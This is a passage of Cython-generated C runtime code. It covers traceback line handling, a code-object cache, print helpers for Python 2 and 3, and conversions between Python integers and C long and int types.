    if (unlikely(!__pyx_cython_runtime)) {
        return c_line;
    }
    __Pyx_ErrFetchInState(tstate, &ptype, &pvalue, &ptraceback);
#if CYTHON_COMPILING_IN_CPYTHON
    cython_runtime_dict = _PyObject_GetDictPtr(__pyx_cython_runtime);
    if (likely(cython_runtime_dict)) {
        __PYX_PY_DICT_LOOKUP_IF_MODIFIED(
            use_cline, *cython_runtime_dict,
            __Pyx_PyDict_GetItemStr(*cython_runtime_dict, __pyx_n_s_cline_in_traceback))
    } else
#endif
    {
      PyObject *use_cline_obj = __Pyx_PyObject_GetAttrStr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback);
      if (use_cline_obj) {
        use_cline = PyObject_Not(use_cline_obj) ? Py_False : Py_True;
        Py_DECREF(use_cline_obj);
      } else {
        PyErr_Clear();
        use_cline = NULL;
      }
    }
    if (!use_cline) {
        c_line = 0;
        PyObject_SetAttr(__pyx_cython_runtime, __pyx_n_s_cline_in_traceback, Py_False);
    }
    else if (use_cline == Py_False || (use_cline != Py_True && PyObject_Not(use_cline) != 0)) {
        c_line = 0;
    }
    __Pyx_ErrRestoreInState(tstate, ptype, pvalue, ptraceback);
    return c_line;
}
#endif

/* CodeObjectCache */
static int __pyx_bisect_code_objects(__Pyx_CodeObjectCacheEntry* entries, int count, int code_line) {
    int start = 0, mid = 0, end = count - 1;
    if (end >= 0 && code_line > entries[end].code_line) {
        return count;
    }
    while (start < end) {
        mid = start + (end - start) / 2;
        if (code_line < entries[mid].code_line) {
            end = mid;
        } else if (code_line > entries[mid].code_line) {
             start = mid + 1;
        } else {
            return mid;
        }
    }
    if (code_line <= entries[mid].code_line) {
        return mid;
    } else {
        return mid + 1;
    }
}
static PyCodeObject *__pyx_find_code_object(int code_line) {
    PyCodeObject* code_object;
    int pos;
    if (unlikely(!code_line) || unlikely(!__pyx_code_cache.entries)) {
        return NULL;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if (unlikely(pos >= __pyx_code_cache.count) || unlikely(__pyx_code_cache.entries[pos].code_line != code_line)) {
        return NULL;
    }
    code_object = __pyx_code_cache.entries[pos].code_object;
    Py_INCREF(code_object);
    return code_object;
}
static void __pyx_insert_code_object(int code_line, PyCodeObject* code_object) {
    int pos, i;
    __Pyx_CodeObjectCacheEntry* entries = __pyx_code_cache.entries;
    if (unlikely(!code_line)) {
        return;
    }
    if (unlikely(!entries)) {
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Malloc(64*sizeof(__Pyx_CodeObjectCacheEntry));
        if (likely(entries)) {
            __pyx_code_cache.entries = entries;
            __pyx_code_cache.max_count = 64;
            __pyx_code_cache.count = 1;
            entries[0].code_line = code_line;
            entries[0].code_object = code_object;
            Py_INCREF(code_object);
        }
        return;
    }
    pos = __pyx_bisect_code_objects(__pyx_code_cache.entries, __pyx_code_cache.count, code_line);
    if ((pos < __pyx_code_cache.count) && unlikely(__pyx_code_cache.entries[pos].code_line == code_line)) {
        PyCodeObject* tmp = entries[pos].code_object;
        entries[pos].code_object = code_object;
        Py_DECREF(tmp);
        return;
    }
    if (__pyx_code_cache.count == __pyx_code_cache.max_count) {
        int new_max = __pyx_code_cache.max_count + 64;
        entries = (__Pyx_CodeObjectCacheEntry*)PyMem_Realloc(
            __pyx_code_cache.entries, ((size_t)new_max) * sizeof(__Pyx_CodeObjectCacheEntry));
        if (unlikely(!entries)) {
            return;
        }
        __pyx_code_cache.entries = entries;
        __pyx_code_cache.max_count = new_max;
    }
    for (i=__pyx_code_cache.count; i>pos; i--) {
        entries[i] = entries[i-1];
    }
    entries[pos].code_line = code_line;
    entries[pos].code_object = code_object;
    __pyx_code_cache.count++;
    Py_INCREF(code_object);
}

/* AddTraceback */
#include "compile.h"
#include "frameobject.h"
#include "traceback.h"
static PyCodeObject* __Pyx_CreateCodeObjectForTraceback(
            const char *funcname, int c_line,
            int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyObject *py_srcfile = 0;
    PyObject *py_funcname = 0;
    #if PY_MAJOR_VERSION < 3
    py_srcfile = PyString_FromString(filename);
    #else
    py_srcfile = PyUnicode_FromString(filename);
    #endif
    if (!py_srcfile) goto bad;
    if (c_line) {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        #else
        py_funcname = PyUnicode_FromFormat( "%s (%s:%d)", funcname, __pyx_cfilenm, c_line);
        #endif
    }
    else {
        #if PY_MAJOR_VERSION < 3
        py_funcname = PyString_FromString(funcname);
        #else
        py_funcname = PyUnicode_FromString(funcname);
        #endif
    }
    if (!py_funcname) goto bad;
    py_code = __Pyx_PyCode_New(
        0,
        0,
        0,
        0,
        0,
        __pyx_empty_bytes, /*PyObject *code,*/
        __pyx_empty_tuple, /*PyObject *consts,*/
        __pyx_empty_tuple, /*PyObject *names,*/
        __pyx_empty_tuple, /*PyObject *varnames,*/
        __pyx_empty_tuple, /*PyObject *freevars,*/
        __pyx_empty_tuple, /*PyObject *cellvars,*/
        py_srcfile,   /*PyObject *filename,*/
        py_funcname,  /*PyObject *name,*/
        py_line,
        __pyx_empty_bytes  /*PyObject *lnotab*/
    );
    Py_DECREF(py_srcfile);
    Py_DECREF(py_funcname);
    return py_code;
bad:
    Py_XDECREF(py_srcfile);
    Py_XDECREF(py_funcname);
    return NULL;
}
static void __Pyx_AddTraceback(const char *funcname, int c_line,
                               int py_line, const char *filename) {
    PyCodeObject *py_code = 0;
    PyFrameObject *py_frame = 0;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    if (c_line) {
        c_line = __Pyx_CLineForTraceback(tstate, c_line);
    }
    py_code = __pyx_find_code_object(c_line ? -c_line : py_line);
    if (!py_code) {
        py_code = __Pyx_CreateCodeObjectForTraceback(
            funcname, c_line, py_line, filename);
        if (!py_code) goto bad;
        __pyx_insert_code_object(c_line ? -c_line : py_line, py_code);
    }
    py_frame = PyFrame_New(
        tstate,            /*PyThreadState *tstate,*/
        py_code,           /*PyCodeObject *code,*/
        __pyx_d,    /*PyObject *globals,*/
        0                  /*PyObject *locals*/
    );
    if (!py_frame) goto bad;
    __Pyx_PyFrame_SetLineNumber(py_frame, py_line);
    PyTraceBack_Here(py_frame);
bad:
    Py_XDECREF(py_code);
    Py_XDECREF(py_frame);
}

/* Print */
#if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION < 3
static PyObject *__Pyx_GetStdout(void) {
    PyObject *f = PySys_GetObject((char *)"stdout");
    if (!f) {
        PyErr_SetString(PyExc_RuntimeError, "lost sys.stdout");
    }
    return f;
}
static int __Pyx_Print(PyObject* f, PyObject *arg_tuple, int newline) {
    int i;
    if (!f) {
        if (!(f = __Pyx_GetStdout()))
            return -1;
    }
    Py_INCREF(f);
    for (i=0; i < PyTuple_GET_SIZE(arg_tuple); i++) {
        PyObject* v;
        if (PyFile_SoftSpace(f, 1)) {
            if (PyFile_WriteString(" ", f) < 0)
                goto error;
        }
        v = PyTuple_GET_ITEM(arg_tuple, i);
        if (PyFile_WriteObject(v, f, Py_PRINT_RAW) < 0)
            goto error;
        if (PyString_Check(v)) {
            char *s = PyString_AsString(v);
            Py_ssize_t len = PyString_Size(v);
            if (len > 0) {
                switch (s[len-1]) {
                    case ' ': break;
                    case '\f': case '\r': case '\n': case '\t': case '\v':
                        PyFile_SoftSpace(f, 0);
                        break;
                    default:  break;
                }
            }
        }
    }
    if (newline) {
        if (PyFile_WriteString("\n", f) < 0)
            goto error;
        PyFile_SoftSpace(f, 0);
    }
    Py_DECREF(f);
    return 0;
error:
    Py_DECREF(f);
    return -1;
}
#else
static int __Pyx_Print(PyObject* stream, PyObject *arg_tuple, int newline) {
    PyObject* kwargs = 0;
    PyObject* result = 0;
    PyObject* end_string;
    if (unlikely(!__pyx_print)) {
        __pyx_print = PyObject_GetAttr(__pyx_b, __pyx_n_s_print);
        if (!__pyx_print)
            return -1;
    }
    if (stream) {
        kwargs = PyDict_New();
        if (unlikely(!kwargs))
            return -1;
        if (unlikely(PyDict_SetItem(kwargs, __pyx_n_s_file_3, stream) < 0))
            goto bad;
        if (!newline) {
            end_string = PyUnicode_FromStringAndSize(" ", 1);
            if (unlikely(!end_string))
                goto bad;
            if (PyDict_SetItem(kwargs, __pyx_n_s_end, end_string) < 0) {
                Py_DECREF(end_string);
                goto bad;
            }
            Py_DECREF(end_string);
        }
    } else if (!newline) {
        if (unlikely(!__pyx_print_kwargs)) {
            __pyx_print_kwargs = PyDict_New();
            if (unlikely(!__pyx_print_kwargs))
                return -1;
            end_string = PyUnicode_FromStringAndSize(" ", 1);
            if (unlikely(!end_string))
                return -1;
            if (PyDict_SetItem(__pyx_print_kwargs, __pyx_n_s_end, end_string) < 0) {
                Py_DECREF(end_string);
                return -1;
            }
            Py_DECREF(end_string);
        }
        kwargs = __pyx_print_kwargs;
    }
    result = PyObject_Call(__pyx_print, arg_tuple, kwargs);
    if (unlikely(kwargs) && (kwargs != __pyx_print_kwargs))
        Py_DECREF(kwargs);
    if (!result)
        return -1;
    Py_DECREF(result);
    return 0;
bad:
    if (kwargs != __pyx_print_kwargs)
        Py_XDECREF(kwargs);
    return -1;
}
#endif

/* PrintOne */
#if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION < 3
static int __Pyx_PrintOne(PyObject* f, PyObject *o) {
    if (!f) {
        if (!(f = __Pyx_GetStdout()))
            return -1;
    }
    Py_INCREF(f);
    if (PyFile_SoftSpace(f, 0)) {
        if (PyFile_WriteString(" ", f) < 0)
            goto error;
    }
    if (PyFile_WriteObject(o, f, Py_PRINT_RAW) < 0)
        goto error;
    if (PyFile_WriteString("\n", f) < 0)
        goto error;
    Py_DECREF(f);
    return 0;
error:
    Py_DECREF(f);
    return -1;
    /* the line below is just to avoid C compiler
     * warnings about unused functions */
    return __Pyx_Print(f, NULL, 0);
}
#else
static int __Pyx_PrintOne(PyObject* stream, PyObject *o) {
    int res;
    PyObject* arg_tuple = PyTuple_Pack(1, o);
    if (unlikely(!arg_tuple))
        return -1;
    res = __Pyx_Print(stream, arg_tuple, 1);
    Py_DECREF(arg_tuple);
    return res;
}
#endif

/* CIntToPy */
static CYTHON_INLINE PyObject* __Pyx_PyInt_From_long(long value) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
    if (is_unsigned) {
        if (sizeof(long) < sizeof(long)) {
            return PyInt_FromLong((long) value);
        } else if (sizeof(long) <= sizeof(unsigned long)) {
            return PyLong_FromUnsignedLong((unsigned long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
            return PyLong_FromUnsignedLongLong((unsigned PY_LONG_LONG) value);
#endif
        }
    } else {
        if (sizeof(long) <= sizeof(long)) {
            return PyInt_FromLong((long) value);
#ifdef HAVE_LONG_LONG
        } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
            return PyLong_FromLongLong((PY_LONG_LONG) value);
#endif
        }
    }
    {
        int one = 1; int little = (int)*(unsigned char *)&one;
        unsigned char *bytes = (unsigned char *)&value;
        return _PyLong_FromByteArray(bytes, sizeof(long),
                                     little, !is_unsigned);
    }
}

/* CIntFromPyVerify */
#define __PYX_VERIFY_RETURN_INT(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 0)
#define __PYX_VERIFY_RETURN_INT_EXC(target_type, func_type, func_value)\
    __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, 1)
#define __PYX__VERIFY_RETURN_INT(target_type, func_type, func_value, exc)\
    {\
        func_type value = func_value;\
        if (sizeof(target_type) < sizeof(func_type)) {\
            if (unlikely(value != (func_type) (target_type) value)) {\
                func_type zero = 0;\
                if (exc && unlikely(value == (func_type)-1 && PyErr_Occurred()))\
                    return (target_type) -1;\
                if (is_unsigned && unlikely(value < zero))\
                    goto raise_neg_overflow;\
                else\
                    goto raise_overflow;\
            }\
        }\
        return (target_type) value;\
    }

/* CIntFromPy */
static CYTHON_INLINE long __Pyx_PyInt_As_long(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const long neg_one = (long) -1, const_zero = (long) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(long) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(long, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (long) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case  1: __PYX_VERIFY_RETURN_INT(long, digit, digits[0])
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 2 * PyLong_SHIFT) {
                            return (long) (((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 3 * PyLong_SHIFT) {
                            return (long) (((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) >= 4 * PyLong_SHIFT) {
                            return (long) (((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (long) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(long) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (long) 0;
                case -1: __PYX_VERIFY_RETURN_INT(long, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(long,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(long) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(long) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                            return (long) ((((((long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(long) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                            return (long) ((((((((long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) (((long)-1)*(((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(long) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(long, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                            return (long) ((((((((((long)digits[3]) << PyLong_SHIFT) | (long)digits[2]) << PyLong_SHIFT) | (long)digits[1]) << PyLong_SHIFT) | (long)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(long) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(long) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(long, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            long val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (long) -1;
        }
    } else {
        long val;
        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);
        if (!tmp) return (long) -1;
        val = __Pyx_PyInt_As_long(tmp);
        Py_DECREF(tmp);
        return val;
    }
raise_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "value too large to convert to long");
    return (long) -1;
raise_neg_overflow:
    PyErr_SetString(PyExc_OverflowError,
        "can't convert negative value to long");
    return (long) -1;
}

/* CIntFromPy */
static CYTHON_INLINE int __Pyx_PyInt_As_int(PyObject *x) {
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wconversion"
#endif
    const int neg_one = (int) -1, const_zero = (int) 0;
#ifdef __Pyx_HAS_GCC_DIAGNOSTIC
#pragma GCC diagnostic pop
#endif
    const int is_unsigned = neg_one > const_zero;
#if PY_MAJOR_VERSION < 3
    if (likely(PyInt_Check(x))) {
        if (sizeof(int) < sizeof(long)) {
            __PYX_VERIFY_RETURN_INT(int, long, PyInt_AS_LONG(x))
        } else {
            long val = PyInt_AS_LONG(x);
            if (is_unsigned && unlikely(val < 0)) {
                goto raise_neg_overflow;
            }
            return (int) val;
        }
    } else
#endif
    if (likely(PyLong_Check(x))) {
        if (is_unsigned) {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case  1: __PYX_VERIFY_RETURN_INT(int, digit, digits[0])
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 2 * PyLong_SHIFT) {
                            return (int) (((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 3 * PyLong_SHIFT) {
                            return (int) (((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) >= 4 * PyLong_SHIFT) {
                            return (int) (((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0]));
                        }
                    }
                    break;
            }
#endif
#if CYTHON_COMPILING_IN_CPYTHON
            if (unlikely(Py_SIZE(x) < 0)) {
                goto raise_neg_overflow;
            }
#else
            {
                int result = PyObject_RichCompareBool(x, Py_False, Py_LT);
                if (unlikely(result < 0))
                    return (int) -1;
                if (unlikely(result == 1))
                    goto raise_neg_overflow;
            }
#endif
            if (sizeof(int) <= sizeof(unsigned long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned long, PyLong_AsUnsignedLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(unsigned PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, unsigned PY_LONG_LONG, PyLong_AsUnsignedLongLong(x))
#endif
            }
        } else {
#if CYTHON_USE_PYLONG_INTERNALS
            const digit* digits = ((PyLongObject*)x)->ob_digit;
            switch (Py_SIZE(x)) {
                case  0: return (int) 0;
                case -1: __PYX_VERIFY_RETURN_INT(int, sdigit, (sdigit) (-(sdigit)digits[0]))
                case  1: __PYX_VERIFY_RETURN_INT(int,  digit, +digits[0])
                case -2:
                    if (8 * sizeof(int) - 1 > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 2:
                    if (8 * sizeof(int) > 1 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 2 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                            return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -3:
                    if (8 * sizeof(int) - 1 > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 3:
                    if (8 * sizeof(int) > 2 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 3 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                            return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case -4:
                    if (8 * sizeof(int) - 1 > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
                case 4:
                    if (8 * sizeof(int) > 3 * PyLong_SHIFT) {
                        if (8 * sizeof(unsigned long) > 4 * PyLong_SHIFT) {
                            __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))
                        } else if (8 * sizeof(int) - 1 > 4 * PyLong_SHIFT) {
                            return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));
                        }
                    }
                    break;
            }
#endif
            if (sizeof(int) <= sizeof(long)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))
#ifdef HAVE_LONG_LONG
            } else if (sizeof(int) <= sizeof(PY_LONG_LONG)) {
                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))
#endif
            }
        }
        {
#if CYTHON_COMPILING_IN_PYPY && !defined(_PyLong_AsByteArray)
            PyErr_SetString(PyExc_RuntimeError,
                            "_PyLong_AsByteArray() not available in PyPy, cannot convert large numbers");
#else
            int val;
            PyObject *v = __Pyx_PyNumber_IntOrLong(x);
 #if PY_MAJOR_VERSION < 3
            if (likely(v) && !PyLong_Check(v)) {
                PyObject *tmp = v;
                v = PyNumber_Long(tmp);
                Py_DECREF(tmp);
            }
 #endif
            if (likely(v)) {
                int one = 1; int is_little = (int)*(unsigned char *)&one;
                unsigned char *bytes = (unsigned char *)&val;
                int ret = _PyLong_AsByteArray((PyLongObject *)v,
                                              bytes, sizeof(val),
                                              is_little, !is_unsigned);
                Py_DECREF(v);
                if (likely(!ret))
                    return val;
            }
#endif
            return (int) -1;
        }
    } else {
        int val;
